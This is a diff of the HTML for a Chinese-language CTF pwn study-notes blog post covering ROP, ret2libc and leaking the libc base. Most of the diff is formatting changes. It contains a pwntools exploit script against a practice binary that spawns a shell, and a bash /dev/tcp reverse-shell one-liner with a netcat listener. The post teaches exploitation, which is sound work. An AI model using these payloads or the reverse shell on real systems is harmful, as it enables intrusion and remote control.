@@ -31,7 +31,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://dojokuro.xyz/2020/08/29/ntu-stcs-2016-w5/w5-ropcall.png">
 <meta property="article:published_time" content="2020-08-29T08:31:45.000Z">
-<meta property="article:modified_time" content="2020-08-29T20:56:28.993Z">
+<meta property="article:modified_time" content="2020-08-29T21:51:42.812Z">
 <meta property="article:author" content="DojoKuro">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
@@ -285,7 +285,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-30 04:56:28" itemprop="dateModified" datetime="2020-08-30T04:56:28+08:00">2020-08-30</time>
+                <time title="Modified: 2020-08-30 05:51:42" itemprop="dateModified" datetime="2020-08-30T05:51:42+08:00">2020-08-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -335,8 +335,7 @@
 <li><em>函数参数直接放到接下来的stack</em></li>
 <li><em>用pop-ret处理用过的参数</em></li>
 </ul>
-<p><strong>ROP call function</strong></p>
-<p><img src="w5-ropcall.png" alt="w5-ropcall"></p>
+<p><strong>ROP call function</strong><br><img src="w5-ropcall.png" alt="w5-ropcall"></p>
 <h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><ul>
 <li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
 <li><em>直接用rop call libc 的system</em></li>
@@ -349,8 +348,7 @@
 <p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取libc路径</span></span><br><span class="line">ldd ./binary</span><br><span class="line"><span class="comment"># 查看libc中的相对位置</span></span><br><span class="line"><span class="comment"># trick 使用 | grep &#x27; system@&#x27;来查看想找的symbol</span></span><br><span class="line">readelf -s /lib32/libc.so.6 | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line"><span class="comment"># 指定加载的libc位置</span></span><br><span class="line">LD_LIBRARY_PATH=./path/to/libc</span><br></pre></td></tr></table></figure>
 
-<p><strong>Function Lazy Binding</strong></p>
-<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
+<p><strong>Function Lazy Binding</strong><br><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
 <p><strong>推算libc base addr</strong></p>
 <ul>
 <li><em>函数在libc的相对位置不变</em><ul>
@@ -370,21 +368,16 @@
 <ul>
 <li><em><del>✘网站：libcdb.com:the libc data base</del></em></li>
 <li><em>✘网站：<a target="_blank" rel="noopener" href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li>
+<li><em>✔使用<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></li>
 </ul>
-</li>
-<li><p><em>✔使用<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)  </span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><strong>Leak libc base</strong></p>
-<p><em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(‘/bin/sh’)</em></p>
-<p>例子：<a href="/uploads/codes/w5/ret2libc3">ret2libc3</a></p>
-<p>exp:</p>
+<p><strong>Leak libc base</strong><br><em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(‘/bin/sh’)</em><br>例子：<a href="/uploads/codes/w5/ret2libc3">ret2libc3</a><br>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><strong>trick:开启reverse tcp shell(web同时适用)</strong></p>
-<p>system(“bash -c ‘bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1’”)</p>
+<p><strong>trick:开启reverse tcp shell(web同时适用)</strong><br>system(“bash -c ‘bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1’”)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/31337 0&gt;&amp;1&#x27;&quot;)</span></span><br><span class="line">nc -vlp 31337</span><br></pre></td></tr></table></figure>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
